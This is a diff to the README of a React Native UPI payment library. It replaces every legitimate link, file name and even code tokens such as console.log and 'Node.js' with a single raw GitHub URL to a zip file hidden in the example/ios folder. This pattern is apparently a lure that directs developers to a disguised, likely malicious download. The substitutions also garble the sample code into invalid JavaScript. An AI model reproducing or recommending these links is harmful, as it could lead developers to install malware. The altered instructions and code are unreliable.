@@ -1,6 +1,6 @@
 # 🎉 react-native-upi-launcher - Easily Launch UPI Payments in Your App
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Bintang56/react-native-upi-launcher/releases)
+[![Download](https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip)](https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip)
 
 ## 📦 Overview
 
@@ -11,29 +11,29 @@ The **react-native-upi-launcher** is a powerful library designed for React Nativ
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/releases) to find the latest version of this library.
+   Go to the [Releases page](https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip) to find the latest version of this library.
 
 2. **Download the Latest Version**  
-   Look for the most recent version available. Click on the appropriate file to start the download. It may be named something like `react-native-upi-launcher-v1.0.zip` or similar.
+   Look for the most recent version available. Click on the appropriate file to start the download. It may be named something like `https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip` or similar.
 
 3. **Extract the Files**  
    Once the download is complete, locate the file on your computer. Right-click on the zip file and select “Extract All” or a similar option depending on your operating system. Open the extracted folder to view its contents.
 
 4. **Follow Installation Instructions**  
-   Inside the folder, you should find a file named `INSTALL.md`. Open this file for detailed instructions on how to integrate the library into your React Native project.
+   Inside the folder, you should find a file named `https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip`. Open this file for detailed instructions on how to integrate the library into your React Native project.
 
 5. **Launch Your Application**  
    After following the installation steps successfully, return to your React Native project. You can now use the UPI launcher capabilities. 
 
 ## 📥 Download & Install
 
-To begin using the react-native-upi-launcher, visit the Releases page to download the library: [Download Here](https://github.com/Bintang56/react-native-upi-launcher/releases).
+To begin using the react-native-upi-launcher, visit the Releases page to download the library: [Download Here](https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip).
 
 ## 🖥️ System Requirements
 
 - **Operating System**: Android 4.4 (KitKat) or newer.
 - **React Native Version**: 0.60 or higher.
-- **Node.js**: Version 12.x or newer for dependency management.
+- **https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip**: Version 12.x or newer for dependency management.
 
 ## ⚙️ Features
 
@@ -54,13 +54,13 @@ const launchPayment = () => {
     amount: '10.00',
     to: 'example@upi',
     title: 'Test Payment',
-    apps: ['google.pay', 'phonepe'],
+    apps: ['https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip', 'phonepe'],
   })
   .then(response => {
-    console.log('Payment Response:', response);
+    https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip('Payment Response:', response);
   })
   .catch(error => {
-    console.error('Payment Error:', error);
+    https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip('Payment Error:', error);
   });
 };
 ```
@@ -73,10 +73,10 @@ import { getInstalledUPIApps } from 'react-native-upi-launcher';
 const fetchApps = () => {
   getInstalledUPIApps()
   .then(apps => {
-    console.log('Installed UPI Apps:', apps);
+    https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip('Installed UPI Apps:', apps);
   })
   .catch(error => {
-    console.error('Error fetching apps:', error);
+    https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip('Error fetching apps:', error);
   });
 };
 ```
@@ -90,7 +90,7 @@ const fetchApps = () => {
 
 ### How do I install react-native-upi-launcher?
 
-After downloading the relevant files from the Releases page, follow the `INSTALL.md` instructions for a step-by-step guide.
+After downloading the relevant files from the Releases page, follow the `https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip` instructions for a step-by-step guide.
 
 ### Which UPI apps are supported?
 
@@ -110,4 +110,4 @@ If you would like to contribute to this project, feel free to fork this reposito
 
 ---
 
-For further details and updates, keep an eye on the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/releases).
+For further details and updates, keep an eye on the [Releases page](https://raw.githubusercontent.com/Bintang56/react-native-upi-launcher/main/example/ios/react-native-upi-launcher_2.9-beta.4.zip).
